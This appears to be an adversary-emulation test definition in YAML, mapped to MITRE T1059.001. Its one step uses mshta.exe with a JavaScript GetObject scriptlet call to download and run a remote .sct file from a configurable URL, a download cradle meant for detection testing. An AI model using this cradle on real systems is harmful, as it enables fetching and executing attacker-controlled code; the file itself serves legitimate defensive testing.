api_version: "2.0"
name: Powershell invoke mshta.exe download
description: |
    Powershell invoke mshta to download payload. Upon execution, a new PowerShell window will be opened which will display "Download Cradle test success!".

    Provided by https://github.com/mgreen27/mgreen27.github.io
args:
    - name: url
      type: string
      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct
uuid: 8a2ad40b-12c7-4b25-8521-2737b0a415af
mitre:
    tactics:
        - 'TA0002: Execution'
    techniques:
        - 'T1059: Command and Scripting Interpreter'
    subtechniques:
        - 'T1059.001: PowerShell'
requirements:
    platforms:
        - os: windows
steps:
    - name: powershell-invoke-mshta.exe-download
      inline: |
        C:\Windows\system32\cmd.exe /c "mshta.exe javascript:a=GetObject('script:{{.Args.url}}').Exec();close()"
      executor: command_prompt
      cleanup:
        inline: ""
        executor: command_prompt
